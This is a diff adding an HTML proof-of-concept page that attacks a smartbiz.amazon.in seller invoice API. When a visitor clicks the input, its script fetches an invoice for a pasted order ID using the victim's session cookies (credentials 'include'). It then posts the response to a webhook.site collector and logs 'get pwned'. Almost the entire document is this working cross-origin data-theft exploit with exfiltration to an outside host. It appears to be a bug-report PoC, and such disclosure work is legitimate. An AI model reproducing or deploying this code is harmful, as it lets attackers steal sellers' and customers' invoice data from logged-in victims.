@@ -1,1 +1,66 @@
-DELETED
+<html>
+<body>
+<label>Order ID (paste here and click input :-) to exec request)
+  <input id="orderInput" placeholder="Paste order ID here"/>
+</label>
+
+<pre id="log">Log output</pre>
+
+<script>
+  const orderInput = document.getElementById('orderInput');
+  const logEl = document.getElementById('log');
+  const storeId = '49411';
+  const amazon_url = "https://smartbiz.amazon.in";
+  const webhookUrl = "https://webhook.site/046b05de-2f7d-43ae-9875-6971f7658023";
+
+  function log(...parts) {
+    const line = parts.map(p => (typeof p === 'string' ? p : JSON.stringify(p))).join(' ');
+    logEl.textContent += '\n' + line;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function poc(orderId) {
+    return `${amazon_url}/api/stores/${encodeURIComponent(storeId)}/order/${encodeURIComponent(orderId)}/seller/invoice`;
+  }
+
+  orderInput.addEventListener('click', async () => {
+    const orderId = orderInput.value.trim();
+    if (!orderId) { log("Please paste an Order ID first"); return; }
+
+    const url = poc(orderId);
+    log('Running fetch()', url);
+
+    try {
+      const res = await fetch(url, { method: 'GET', credentials: 'include' });
+      log('Response:', res.status, res.statusText);
+
+      const contentType = res.headers.get('content-type') || '';
+      let payload;
+      if (contentType.includes('application/json')) {
+        payload = await res.json();
+      } else {
+        payload = await res.text();
+      }
+
+      log('Preview:', typeof payload === 'string' ? payload.slice(0,1000) : JSON.stringify(payload,null,2).slice(0,1000));
+
+      try {
+        const forwardBody = (typeof payload === 'string') ? { data: payload } : payload;
+        const forwardRes = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(forwardBody)
+        });
+        log('Forwarded and get pwned :p:', forwardRes.status, forwardRes.statusText);
+      } catch (fwErr) {
+        log('Failed to forward:', fwErr.toString());
+      }
+
+    } catch (err) {
+      log('error:', err.toString());
+    }
+  });
+</script>
+</body>
+</html>
+
